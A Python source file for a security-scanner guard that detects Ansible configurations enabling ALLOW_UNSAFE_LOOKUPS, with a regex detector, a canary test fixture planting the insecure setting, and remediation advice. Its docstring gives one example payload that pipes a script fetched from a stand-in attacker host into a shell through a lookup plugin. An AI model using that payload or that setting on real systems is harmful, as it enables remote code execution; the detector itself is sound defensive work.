"""Guard: ALLOW_UNSAFE_LOOKUPS enabled — lookup-plugin RCE bypass (checklist §3a).

`ALLOW_UNSAFE_LOOKUPS = True` (or `allow_unsafe_lookups: true` in play-level `vars:`,
a role's `defaults/main.yml`, or `ansible.cfg`) disables Ansible's default protection
that strips the `!unsafe` marker from a lookup plugin's return value. Once disabled,
an attacker-controlled external source read by `lookup('file', ...)`,
`lookup('url', ...)`, `lookup('pipe', ...)`, `lookup('hashi_vault', ...)`, or any
custom lookup can return a Jinja expression that Ansible's template engine will then
RE-EVALUATE — a classic template-injection-to-RCE chain
(`{{ lookup('pipe', 'curl evil.example.com/x.sh | sh') }}`). CWE-94, CWE-1336,
OWASP:A03.

Sourced from `cpeoples/ansible-security-scanner`'s `ansible_hygiene.yml` rule
`allow_unsafe_lookups_enabled`, verified against real fetched source.

Fires HIGH per match:

    allow_unsafe_lookups: true  # security: allow-ansible-unsafe-lookups-enabled

Scans `.yml`/`.yaml` files AND `ansible.cfg` (an INI file, where the same setting is
written `allow_unsafe_lookups = True` under `[defaults]`).
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    iter_files_named,
    pragma_present,
    read,
    rel,
    strip_hash_comments,
)

_SUFFIXES = (".yml", ".yaml")
_PRAGMA = "security: allow-ansible-unsafe-lookups-enabled"
_PATTERN = re.compile(
    r"(?mi)^[^\S\n]*(?:ALLOW_UNSAFE_LOOKUPS|allow_unsafe_lookups)\s*[:=]\s*(?:true|True|yes|Yes|1)\b"
)


class AnsibleUnsafeLookupsEnabledGuard(Guard):
    id = "ansible-unsafe-lookups-enabled"
    title = "ALLOW_UNSAFE_LOOKUPS enabled — lookup-plugin RCE bypass"
    area = "Server hardening"

    # group_vars_all_canary.yml: allow_unsafe_lookups: true -> fires ansible-unsafe-lookups-enabled.
    canary_plant = CanaryPlant(
        files={
            "group_vars_all_canary.yml": "allow_unsafe_lookups: true\n",
        },
        expects=frozenset({"ansible-unsafe-lookups-enabled/global-override"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return "ansible" in profile.features

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        files = [*iter_files(root, _SUFFIXES), *iter_files_named(root, "ansible.cfg")]
        for f in files:
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            text = read(f)
            if pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
                continue
            code = strip_hash_comments(text)
            m = _PATTERN.search(code)
            if not m:
                continue
            line = code.count("\n", 0, m.start()) + 1
            out.append(
                Finding(
                    check_id=self.id,
                    severity="high",
                    title=self.title,
                    location=f"{rel(root, f)}:{line}",
                    message=(
                        "ALLOW_UNSAFE_LOOKUPS is enabled here, disabling Ansible's default "
                        "protection that strips the !unsafe marker from a lookup plugin's "
                        "return value. An attacker-controlled lookup source can now return "
                        "a Jinja expression that gets re-evaluated as a template — a "
                        "template-injection-to-RCE chain."
                    ),
                    remediation=(
                        "Remove the setting; the Ansible default (disabled) is correct. If "
                        "a single trusted lookup genuinely needs to return renderable "
                        "content, wrap only that call's result rather than flipping the "
                        "global switch."
                    ),
                    rule="ansible-unsafe-lookups-enabled/global-override",
                    standards=["OWASP:A03", "CWE-94", "CWE-1336"],
                )
            )
        return out
